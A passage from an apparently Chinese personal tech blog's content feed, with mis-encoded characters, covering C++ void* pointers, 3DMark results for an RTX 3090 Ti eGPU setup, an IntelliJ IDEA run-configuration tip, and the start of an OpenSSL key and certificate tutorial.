data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span><span class="token operator">*</span> pv <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">void</span><span class="token operator">*</span> pv2 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>cout<span class="token operator">&lt;&lt;</span>pv <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment">//å€¼ä¸º0x0</span>cout<span class="token operator">&lt;&lt;</span>pv2<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment">//å€¼ä¸º0x0</span></code></pre><h3 id="2-4-å½“void-æŒ‡é’ˆ-ä½œä¸ºå‡½æ•°çš„è¾“å…¥å’Œè¾“å‡º-æ—¶ï¼Œè¡¨ç¤ºå¯ä»¥-æ¥å—ä»»æ„ç±»å‹çš„è¾“å…¥æŒ‡é’ˆå’Œè¾“å‡ºä»»æ„ç±»å‹çš„æŒ‡é’ˆ">**2.4 å½“void*æŒ‡é’ˆ*<em>ä½œä¸ºå‡½æ•°çš„è¾“å…¥å’Œè¾“å‡º*<em>æ—¶ï¼Œè¡¨ç¤ºå¯ä»¥*<em>æ¥å—ä»»æ„ç±»å‹çš„è¾“å…¥æŒ‡é’ˆå’Œè¾“å‡ºä»»æ„ç±»å‹çš„æŒ‡é’ˆ*</em></em></em></h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> aï¼›<span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token operator">*</span> pi <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span>pi<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>              <span class="token comment">//å€¼ä¸º0x100001060</span>    cout<span class="token operator">&lt;&lt;</span><span class="token function">test</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>        <span class="token comment">//å€¼ä¸º0x100001060</span>    cout<span class="token operator">&lt;&lt;</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>pi<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment">//å€¼ä¸º0x100001060</span><span class="token punctuation">&#125;</span></code></pre><p>å¦‚æœå‡½æ•°çš„è¾“å…¥ç±»å‹ä¸ºvoid*ï¼Œåœ¨è°ƒç”¨æ—¶ç”±äºæ˜¯å€¼ä¼ é€’ï¼Œæ‰€ä»¥å‡½æ•°å®é™…æ¥æ”¶åˆ°çš„åº”è¯¥å°±æ˜¯ä¸€ä¸ªåœ°å€å€¼ã€‚è¿™ä¸ªå€¼å¯ä»¥æ˜¯ä»»æ„ç±»å‹ã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token operator">*</span> pi <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> pi<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>        <span class="token comment">//å€¼ä¸º0x100001060</span><span class="token punctuation">&#125;</span></code></pre><p>è¾“å‡ºæ—¶åŒæ ·ä¹Ÿæ˜¯å€¼ä¼ é€’ï¼Œå› æ­¤å¯ä»¥è¾“å‡ºä»»æ„ç±»å‹æŒ‡é’ˆæŒ‡å‘çš„åœ°å€ã€‚</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> void* </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤–ç½®æ˜¾å¡å-3090ti-å†…å¤–å±3Dmarkè·‘åˆ†æµ‹è¯•</title>
      <link href="/posts/ff9407ae/"/>
      <url>/posts/ff9407ae/</url>
      
        <content type="html"><![CDATA[<h1>æ˜¾å¡åæµ‹è¯•</h1><blockquote><p>ç¬”è®°æœ¬é›·ç”µ4æ¥å£ï¼Œ</p><p>å¤–ç½®æ˜¾å¡å</p><p>å¤–ç½®æ˜¾å¡ï¼š 3090ti æ˜Ÿè€€OC</p><p>ç¬”è®°æœ¬é…ç½®ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span>è®¾å¤‡åç§°Zephyrus16<span class="token operator">></span>å¤„ç†å™¨11th Gen Intel<span class="token punctuation">(</span>R<span class="token punctuation">)</span> Core<span class="token punctuation">(</span>TM<span class="token punctuation">)</span> i7-11800H @ <span class="token number">2</span>.30GHz   <span class="token number">2.30</span> GHz<span class="token operator">></span>æœºå¸¦ RAM<span class="token number">40.0</span> GB <span class="token punctuation">(</span><span class="token number">39.7</span> GB å¯ç”¨<span class="token punctuation">)</span><span class="token operator">></span>ç³»ç»Ÿç±»å‹<span class="token number">64</span> ä½æ“ä½œç³»ç»Ÿ, åŸºäº x64 çš„å¤„ç†å™¨<span class="token operator">></span>ç¬”å’Œè§¦æ§æ²¡æœ‰å¯ç”¨äºæ­¤æ˜¾ç¤ºå™¨çš„ç¬”æˆ–è§¦æ§è¾“å…¥</code></pre><p>windowsç‰ˆæœ¬</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span>ç‰ˆæœ¬Windows <span class="token number">11</span> ä¸“ä¸šç‰ˆ<span class="token operator">></span>ç‰ˆæœ¬22H2<span class="token operator">></span>å®‰è£…æ—¥æœŸâ€2022/â€10/â€4<span class="token operator">></span>æ“ä½œç³»ç»Ÿç‰ˆæœ¬<span class="token number">22621.525</span><span class="token operator">></span>ä½“éªŒWindows Feature Experience Pack <span class="token number">1000.22634</span>.1000.0</code></pre><p><img src="https://s2.loli.net/2022/10/12/fG5D2sgaIwMmUuE.png" class="lazyload" data-srcset="https://s2.loli.net/2022/10/12/fG5D2sgaIwMmUuE.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221012144844019"></p><p><img src="https://s2.loli.net/2022/10/12/SIeVkbohKYPQlG7.png" class="lazyload" data-srcset="https://s2.loli.net/2022/10/12/SIeVkbohKYPQlG7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221012151304216"></p><p><img src="https://s2.loli.net/2022/10/12/5XhCx4I8U7EvPMo.png" class="lazyload" data-srcset="https://s2.loli.net/2022/10/12/5XhCx4I8U7EvPMo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221012151229453"></p></blockquote><h2 id="3dmarkè·‘åˆ†">3dmarkè·‘åˆ†</h2><div class="story post-story"><h3 id="Time-Spy-Extreme-4K">Time Spy Extreme-4K</h3><p><strong>4K Dircetx12</strong></p><h4 id="å¤–æ¥4kæ˜¾ç¤ºå™¨">å¤–æ¥4kæ˜¾ç¤ºå™¨</h4><p><img src="https://s2.loli.net/2022/10/12/YkmXDPAJGlcrdV7.png" class="lazyload" data-srcset="https://s2.loli.net/2022/10/12/YkmXDPAJGlcrdV7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221012143152746"></p><blockquote><p><img src="https://s2.loli.net/2022/10/12/MklrJjtnp9A1y2T.png" class="lazyload" data-srcset="https://s2.loli.net/2022/10/12/MklrJjtnp9A1y2T.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221012155839193"></p><p><a href="https://view.inews.qq.com/a/20220615A04T5I00">https://view.inews.qq.com/a/20220615A04T5I00</a></p><p>åœ¨3DMarkçš„Time Spy Extremeï¼ˆ4Kæ¸²æŸ“åˆ†è¾¨ç‡ï¼‰æµ‹è¯•ä¸­ï¼Œå½±é©°RTX 3090 Tiæ˜Ÿæ›œOCå–å¾—äº†9813åˆ†çš„æˆç»©ï¼Œå…¶ä¸­æ˜¾å¡åˆ†æ•°ä¸º11199ã€‚</p><p><strong>å¤§çº¦æŸè€—ï¼š</strong> <font color='orange'>(11199-9812)/11199 = 12%</font></p></blockquote><h3 id="Fire-Strike-Ultra-4K">Fire Strike Ultra-4K</h3><p><strong>4k DirectX 11</strong></p><h4 id="å¤–æ¥4kæ˜¾ç¤ºå™¨-2">å¤–æ¥4kæ˜¾ç¤ºå™¨</h4><p><img src="https://s2.loli.net/2022/10/12/BcJa3Lz4WtEiZoy.png" class="lazyload" data-srcset="https://s2.loli.net/2022/10/12/BcJa3Lz4WtEiZoy.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221012144610742"></p><blockquote><p><img src="https://s2.loli.net/2022/10/12/3PNysbjr62dfH7m.png" class="lazyload" data-srcset="https://s2.loli.net/2022/10/12/3PNysbjr62dfH7m.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221012155929127"></p><p><a href="https://view.inews.qq.com/a/20220615A04T5I00">https://view.inews.qq.com/a/20220615A04T5I00</a></p><p>åœ¨3DMarkçš„Fire Strike Ultraï¼ˆ4Kæ¸²æŸ“åˆ†è¾¨ç‡ï¼‰æµ‹è¯•é¡¹ç›®ä¸­ï¼Œå½±é©°RTX 3090 Tiæ˜Ÿæ›œOCå–å¾—äº†14159åˆ†çš„æˆç»©ï¼Œå…¶ä¸­æ˜¾å¡åˆ†æ•°ä¸º14158ã€‚</p><p><font color='orange'>å¤§çº¦æŸè€—ï¼šï¼ˆ14158-11336)/14158 = 20%</font></p></blockquote><h3 id="Port-Royal-4K">Port Royal-4K</h3><h4 id="å¤–æ¥4kæ˜¾ç¤ºå™¨-3">å¤–æ¥4kæ˜¾ç¤ºå™¨</h4><p><img src="https://s2.loli.net/2022/10/12/xBEa4F1QCltSjNU.png" class="lazyload" data-srcset="https://s2.loli.net/2022/10/12/xBEa4F1QCltSjNU.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221012145903471"></p><h3 id="Time-Spy-2K">Time Spy- 2K</h3><h4 id="å¤–æ¥4kæ˜¾ç¤ºå™¨-4">å¤–æ¥4kæ˜¾ç¤ºå™¨</h4><p><img src="https://s2.loli.net/2022/10/12/qWxdOTpiQkSunmP.png" class="lazyload" data-srcset="https://s2.loli.net/2022/10/12/qWxdOTpiQkSunmP.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-123"></p><blockquote><p>(21784-17445)/21784 = 19.9%</p></blockquote><h4 id="å†…å±">å†…å±</h4><p><img src="https://s2.loli.net/2022/10/12/2UwszlBEnO9Kc8v.png" class="lazyload" data-srcset="https://s2.loli.net/2022/10/12/2UwszlBEnO9Kc8v.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221012154518326"></p><blockquote><p><a href="https://view.inews.qq.com/a/20220615A04T5I00">https://view.inews.qq.com/a/20220615A04T5I00</a></p><p>åœ¨3DMarkçš„Time Spyï¼ˆ2Kæ¸²æŸ“åˆ†è¾¨ç‡ï¼‰æµ‹è¯•ä¸­ï¼Œå½±é©°RTX 3090 Tiæ˜Ÿæ›œOCå–å¾—äº†19449åˆ†çš„æˆç»©ï¼Œå…¶ä¸­æ˜¾å¡åˆ†æ•°ä¸º21784ã€‚</p><p><font color='orange'>æ€§èƒ½æŸè€—ï¼š(21784-12295) /21784 = 43%</font></p></blockquote><h3 id="Fire-Strike-2K">Fire Strike-2K</h3><h4 id="å¤–æ¥4kæ˜¾ç¤ºå™¨-5">å¤–æ¥4kæ˜¾ç¤ºå™¨</h4><p><img src="https://s2.loli.net/2022/10/12/8o1admUlvIuxE9T.png" class="lazyload" data-srcset="https://s2.loli.net/2022/10/12/8o1admUlvIuxE9T.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221012161740384"></p><blockquote><p>åœ¨3DMarkçš„Fire Strike Extremeï¼ˆ2Kæ¸²æŸ“åˆ†è¾¨ç‡ï¼‰æµ‹è¯•é¡¹ç›®ä¸­ï¼Œå½±é©°RTX 3090 Tiæ˜Ÿæ›œOCå–å¾—äº†25551åˆ†çš„æˆç»©ï¼Œå…¶ä¸­æ˜¾å¡åˆ†æ•°ä¸º27375ã€‚</p><p><font color='orange'>æŸè€—ï¼š(27375-17445)/27375 = 36%</font></p></blockquote><h4 id="å†…å±-2">å†…å±</h4><p><img src="https://s2.loli.net/2022/10/12/VQD1ghY3xBqiTOc.jpg" class="lazyload" data-srcset="https://s2.loli.net/2022/10/12/VQD1ghY3xBqiTOc.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="fire-2k-"></p><blockquote><p>åœ¨3DMarkçš„Fire Strike Extremeï¼ˆ2Kæ¸²æŸ“åˆ†è¾¨ç‡ï¼‰æµ‹è¯•é¡¹ç›®ä¸­ï¼Œå½±é©°RTX 3090 Tiæ˜Ÿæ›œOCå–å¾—äº†25551åˆ†çš„æˆç»©ï¼Œå…¶ä¸­æ˜¾å¡åˆ†æ•°ä¸º27375ã€‚</p><p><font color='orange'>æŸè€—ï¼š(27375-16496)/27375 = 39%</font></p></blockquote></div>]]></content>
      
      
      
        <tags>
            
            <tag> 3090ti </tag>
            
            <tag> å¤–ç½®æ˜¾å¡å </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Idea Javaç›´æ¥ä»£ç æµ‹è¯•,è·³è¿‡jaråŒ…ç¼–è¯‘</title>
      <link href="/posts/568a27eb/"/>
      <url>/posts/568a27eb/</url>
      
        <content type="html"><![CDATA[<h1>IDEA ç›´æ¥ä»£ç æµ‹è¯•ï¼Œ ä¸ä½¿ç”¨jaråŒ…</h1><blockquote><p>tips</p></blockquote><p>æ¯æ¬¡å†™å®Œä»£ç åï¼Œéƒ½å¾—éœ€è¦ç”¨maven packageä¸€ä¸‹å¤ªéº»çƒ¦å•¦</p><p>è¿˜å¥½æˆ‘ä»¬æœ‰å¼ºå¤§çš„IDEA (â—â€™â—¡â€™â—)</p><h2 id="ç®€å•ç‰›åˆ€å°è¯•">ç®€å•ç‰›åˆ€å°è¯•</h2><div class="story post-story"><p><strong>æœ€ç®€å•çš„æœ¬åœ°æµ‹è¯•</strong></p><p><img src="https://s2.loli.net/2022/08/21/Mjf2Nv1x5b39kWE.png" class="lazyload" data-srcset="https://s2.loli.net/2022/08/21/Mjf2Nv1x5b39kWE.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220821213134483"></p><p><font color='red' size='5'>æ³¨æ„program argument é‡Œçš„è·¯å¾„æ˜¯ç›¸å¯¹äº<code>working directory</code></font></p><p>ç„¶åå°±å¯ä»¥æ¬¢å¿«çš„ä»£ç é‡Œç›´æ¥æµ‹è¯•å•¦</p><p><img src="https://s2.loli.net/2022/08/21/CgkWQ2jApPrziIs.png" class="lazyload" data-srcset="https://s2.loli.net/2022/08/21/CgkWQ2jApPrziIs.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220821213401079"></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> idea </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenSSL ç”Ÿæˆå…¬ç§é’¥ä¸è‡ªç­¾åè¯ä¹¦ç›¸å…³çŸ¥è¯†</title>
      <link href="/posts/210154ee/"/>
      <url>/posts/210154ee/</url>
      
        <content type="html"><![CDATA[<h1>OpenSSL æ•™ç¨‹</h1><blockquote><p>2022-07-30 09:41:34</p><p>sizaif</p></blockquote><h2 id="åŸºç¡€çŸ¥è¯†">åŸºç¡€çŸ¥è¯†</h2><div class="story post-story"><h3 id="crt-pem-key">.crt .pem .key</h3><p><strong>PEM</strong> - Privacy Enhanced Mail ä»¥â€œ-----BEGINâ€¦â€å¼€å¤´ï¼Œâ€œ-----ENDâ€¦â€ç»“å°¾ï¼Œå†…å®¹æ˜¯<code> BASE64</code> ç¼–ç ã€‚</p><p>PEMæ ¼å¼æ˜¯<a href="https://www.sslshopper.com/certificate-authority-reviews.html">è¯ä¹¦é¢å‘æœºæ„</a>é¢å‘è¯ä¹¦çš„æœ€å¸¸è§æ ¼å¼.PEMè¯ä¹¦é€šå¸¸å…·æœ‰æ‰©å±•åï¼Œä¾‹**.pemï¼Œ.crtï¼Œ.cerå’Œ.key**ã€‚å®ƒä»¬æ˜¯Base64ç¼–ç çš„ASCIIæ–‡ä»¶ï¼ŒåŒ…å«â€œ----- BEGIN CERTIFICATE -----â€å’Œâ€œ----- END CERTIFICATE -----â€è¯­å¥ã€‚æœåŠ¡å™¨è¯ä¹¦ï¼Œä¸­é—´è¯ä¹¦å’Œç§é’¥éƒ½å¯ä»¥æ”¾å…¥PEMæ ¼å¼ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl x509 -in certificate.pem -text -noout <span class="token comment">#pem</span></code></pre><p><strong>DER</strong> - Distinguished Encoding Rules</p><p>DERæ ¼å¼åªæ˜¯è¯ä¹¦çš„äºŒè¿›åˆ¶å½¢å¼ï¼Œè€Œä¸æ˜¯ASCII PEMæ ¼å¼ã€‚å®ƒæœ‰æ—¶ä¼šæœ‰**.der<strong>çš„æ–‡ä»¶æ‰©å±•åï¼Œä½†å®ƒçš„æ–‡ä»¶æ‰©å±•åé€šå¸¸æ˜¯</strong>.cer<strong>æ‰€ä»¥åˆ¤æ–­DER .ceræ–‡ä»¶å’ŒPEM .ceræ–‡ä»¶ä¹‹é—´åŒºåˆ«çš„å”¯ä¸€æ–¹æ³•æ˜¯åœ¨æ–‡æœ¬ç¼–è¾‘å™¨ä¸­æ‰“å¼€å®ƒå¹¶æŸ¥æ‰¾BEGIN / ENDè¯­å¥ã€‚æ‰€æœ‰ç±»å‹çš„è¯ä¹¦å’Œç§é’¥éƒ½å¯ä»¥ç”¨DERæ ¼å¼ç¼–ç ã€‚DERé€šå¸¸ä¸</strong>Javaå¹³å°ä¸€èµ·ä½¿ç”¨ï¼Œ**Java å’Œ Windows æœåŠ¡å™¨åå‘äºä½¿ç”¨è¿™ç§ç¼–ç æ ¼å¼ã€‚<a href="https://so.csdn.net/so/search?q=SSL&amp;spm=1001.2101.3001.7020">SSL</a>è½¬æ¢å™¨åªèƒ½å°†è¯ä¹¦è½¬æ¢ä¸ºDERæ ¼å¼</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl x509 -in certificate.der -inform der -text -noout <span class="token comment">#der</span></code></pre><p><strong>CRT</strong>  æ˜¯ certificate çš„ä¸‰ä¸ªå­—æ¯ï¼Œå…¶å®è¿˜æ˜¯è¯ä¹¦çš„æ„æ€ã€‚å¸¸è§äº UNIX ç³»ç»Ÿï¼Œæœ‰å¯èƒ½æ˜¯ PEM ç¼–ç ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ DER ç¼–ç ï¼Œå¤§å¤šæ•°åº”è¯¥æ˜¯ PEM ç¼–ç ï¼Œç›¸ä¿¡ä½ å·²ç»çŸ¥é“æ€ä¹ˆè¾¨åˆ«ã€‚</p><p><strong>CER</strong> è¿˜æ˜¯ certificateï¼Œè¿˜æ˜¯è¯ä¹¦ã€‚å¸¸è§äº Windows ç³»ç»Ÿï¼ŒåŒæ ·çš„å¯èƒ½æ˜¯ PEM ç¼–ç ï¼Œä¹Ÿå¯èƒ½æ˜¯ DER ç¼–ç ï¼Œå¤§å¤šæ•°åº”è¯¥æ˜¯ DER ç¼–ç ã€‚</p><p><strong>KEY</strong> é€šå¸¸ç”¨æ¥å­˜æ”¾ä¸€ä¸ªå…¬é’¥æˆ–è€…<a href="https://so.csdn.net/so/search?q=%E7%A7%81%E9%92%A5&amp;spm=1001.2101.3001.7020">ç§é’¥</a>ï¼Œå¹¶é X.509 è¯ä¹¦ã€‚ç¼–ç åŒæ ·çš„ï¼Œå¯èƒ½æ˜¯ PEMï¼Œä¹Ÿå¯èƒ½æ˜¯ DER</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl rsa -in mykey.key -text -noout  <span class="token comment"># pem</span>openssl rsa -in mykey.key -text -noout -inform der <span class="token comment"># der</span></code></pre><p><strong>CSR</strong> Certificateï¼ŒSigning Requestï¼Œå³è¯ä¹¦ç­¾åè¯·æ±‚ã€‚è¿™ä¸ªå¹¶ä¸æ˜¯è¯ä¹¦ï¼Œè€Œæ˜¯å‘æƒå¨è¯ä¹¦é¢å‘æœºæ„è·å¾—ç­¾åè¯ä¹¦çš„ç”³è¯·ï¼Œå…¶æ ¸å¿ƒå†…å®¹æ˜¯ä¸€ä¸ªå…¬é’¥ï¼ˆå½“ç„¶è¿˜é™„å¸¦äº†ä¸€äº›åˆ«çš„ä¿¡æ¯ï¼‰ã€‚åœ¨ç”Ÿæˆè¿™ä¸ªç”³è¯·çš„æ—¶å€™ï¼Œ<strong>åŒæ—¶ä¹Ÿä¼šç”Ÿæˆä¸€ä¸ªç§é’¥</strong>ï¼Œç§é’¥è¦è‡ªå·±ä¿ç®¡å¥½ã€‚åšè¿‡ iOS APP çš„æœ‹å‹éƒ½åº”è¯¥çŸ¥é“æ˜¯ï¼Œæ€ä¹ˆå‘è‹¹æœç”³è¯·å¼€å‘è€…è¯ä¹¦çš„å§ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl req -noout -text -in my.csr  <span class="token comment"># </span></code></pre></div><h2 id="æŸ¥çœ‹å¸®åŠ©">æŸ¥çœ‹å¸®åŠ©</h2><div class="story post-story"><pre class="language-bash" data-language="bash"><code class="language-bash">openssl <span class="token builtin class-name">help</span></code></pre><h3 id="genrsa"><code>genrsa</code></h3><p>å¹³æ—¶ä¸»è¦ç”¨æ¥ç”Ÿæˆç§é’¥ï¼Œé€‰æ‹©ä½¿ç”¨çš„ç®—æ³•ã€å¯¹ç§°åŠ å¯†å¯†ç å’Œç§é’¥é•¿åº¦æ¥ç”Ÿæˆç§é’¥</p><pre class="language-none"><code class="language-none">openssl genrsa [args] [numbits] # ã€æ›´å¤šå‚æ•°æŸ¥çœ‹ï¼šopenssl genrsa -helpã€‘</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">args1 å¯¹ç”Ÿæˆçš„ç§é’¥æ–‡ä»¶æ˜¯å¦è¦ä½¿ç”¨åŠ å¯†ç®—æ³•è¿›è¡Œå¯¹ç§°åŠ å¯†:     -des <span class="token builtin class-name">:</span> CBCæ¨¡å¼çš„DESåŠ å¯†     -des3 <span class="token builtin class-name">:</span> CBCæ¨¡å¼çš„3DESåŠ å¯†     -aes128 <span class="token builtin class-name">:</span> CBCæ¨¡å¼çš„AES128åŠ å¯†     -aes192 <span class="token builtin class-name">:</span> CBCæ¨¡å¼çš„AES192åŠ å¯†     -aes256 <span class="token builtin class-name">:</span> CBCæ¨¡å¼çš„AES256åŠ å¯† args2 å¯¹ç§°åŠ å¯†å¯†ç     -passout passwords    å…¶ä¸­passwordsä¸ºå¯¹ç§°åŠ å¯†<span class="token punctuation">(</span>desã€3desã€aes<span class="token punctuation">)</span>çš„å¯†ç <span class="token punctuation">(</span>ä½¿ç”¨è¿™ä¸ªå‚æ•°å°±çœå»äº†consoleäº¤äº’æç¤ºè¾“å…¥å¯†ç çš„ç¯èŠ‚<span class="token punctuation">)</span> args3 è¾“å‡ºæ–‡ä»¶    -out <span class="token function">file</span> <span class="token builtin class-name">:</span> è¾“å‡ºè¯ä¹¦ç§é’¥æ–‡ä»¶ <span class="token punctuation">[</span>numbits<span class="token punctuation">]</span>: å¯†é’¥é•¿åº¦ï¼Œç†è§£ä¸ºç§é’¥é•¿åº¦ </code></pre><p>ç”Ÿæˆä¸€ä¸ª2048ä½çš„RSAç§é’¥ï¼Œå¹¶ç”¨des3åŠ å¯†(å¯†ç ä¸º123456)ï¼Œä¿å­˜ä¸ºserver.keyæ–‡ä»¶</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl genrsa -des3 -passout pass:123456 -out server.key  <span class="token number">2048</span>// -des3 æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°args1ï¼›  // -passout pass:123456 æ˜¯ç¬¬äºŒä¸ªå‚æ•°å†™æ³• args2// -out server.key ç¬¬ä¸‰ä¸ªå‚æ•°args3ï¼›   // <span class="token number">2048</span> æœ€åä¸€ä¸ª<span class="token punctuation">[</span>numbits<span class="token punctuation">]</span>å‚æ•°</code></pre><h3 id="req"><code>req</code></h3><p><code>req</code>çš„åŸºæœ¬åŠŸèƒ½ä¸»è¦æœ‰ä¸¤ä¸ªï¼šç”Ÿæˆè¯ä¹¦è¯·æ±‚å’Œç”Ÿæˆè‡ªç­¾åè¯ä¹¦ï¼Œå½“ç„¶è¿™å¹¶ä¸æ˜¯å…¶å…¨éƒ¨åŠŸèƒ½ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªæœ€ä¸ºå¸¸è§ï¼›</p><p>å¸¸è§ä½¿ç”¨æ–¹æ³•ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl req <span class="token punctuation">[</span>args<span class="token punctuation">]</span> outfile</code></pre><p>ä¸»è¦å‚æ•°ï¼šã€æ›´å¤šå‚æ•°æŸ¥çœ‹ï¼šopenssl req -helpã€‘</p><pre class="language-bash" data-language="bash"><code class="language-bash">args1 æ˜¯è¾“å…¥è¾“å…¥æ–‡ä»¶æ ¼å¼ï¼š-inform arg    -inform DER ä½¿ç”¨è¾“å…¥æ–‡ä»¶æ ¼å¼ä¸ºDER    -inform PEM ä½¿ç”¨è¾“å…¥æ–‡ä»¶æ ¼å¼ä¸ºPEMargs2 è¾“å‡ºæ–‡ä»¶æ ¼å¼:-outform arg       -outform DER ä½¿ç”¨è¾“å‡ºæ–‡ä»¶æ ¼å¼ä¸ºDER    -outform PEM ä½¿ç”¨è¾“å‡ºæ–‡ä»¶æ ¼å¼ä¸ºPEMargs3 æ˜¯å¾…å¤„ç†æ–‡ä»¶     -in inputfilepathargs4 å¾…è¾“å‡ºæ–‡ä»¶    -out outputfilepathargs5 ç”¨äºç­¾åå¾…ç”Ÿæˆçš„è¯·æ±‚è¯ä¹¦çš„ç§é’¥æ–‡ä»¶çš„è§£å¯†å¯†ç     -passin passwords       args6 ç”¨äºç­¾åå¾…ç”Ÿæˆçš„è¯·æ±‚è¯ä¹¦çš„ç§é’¥æ–‡ä»¶    -key <span class="token function">file</span>args7æŒ‡å®šè¾“å…¥å¯†é’¥çš„ç¼–ç æ ¼å¼ -keyform arg      -keyform  DER    -keyform  NET     -keyform  PEMargs8 ç”Ÿæˆæ–°çš„è¯ä¹¦è¯·æ±‚     -newargs9è¾“å‡ºä¸€ä¸ªX509æ ¼å¼çš„è¯ä¹¦,ç­¾åè¯ä¹¦æ—¶ä½¿ç”¨      -x509          args10ä½¿ç”¨X509ç­¾åè¯ä¹¦çš„æœ‰æ•ˆæ—¶é—´      -days  // -days <span class="token number">3650</span> æœ‰æ•ˆæœŸ10å¹´ args11ç”Ÿæˆä¸€ä¸ªbitsé•¿åº¦çš„RSAç§é’¥æ–‡ä»¶ï¼Œç”¨äºç­¾å‘ã€ç”Ÿæˆç§é’¥ã€å¹¶ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ã€‘     -newkey rsa:bits   args12è®¾ç½®HASHç®—æ³•-<span class="token punctuation">[</span>digest<span class="token punctuation">]</span>ã€ç”Ÿæˆç§é’¥æŒ‡å®šçš„hashæ‘˜è¦ç®—æ³•ã€‘    -md5    -sha1  // é«˜ç‰ˆæœ¬æµè§ˆå™¨å¼€å§‹ä¸ä¿¡ä»»è¿™ç§ç®—æ³•    -md2    -mdc2    -md4args13æŒ‡å®šopensslé…ç½®æ–‡ä»¶,å¾ˆå¤šå†…å®¹ä¸å®¹æ˜“é€šè¿‡å‚æ•°é…ç½®ï¼Œå¯ä»¥æŒ‡å®šé…ç½®æ–‡ä»¶    -config filepath   args14 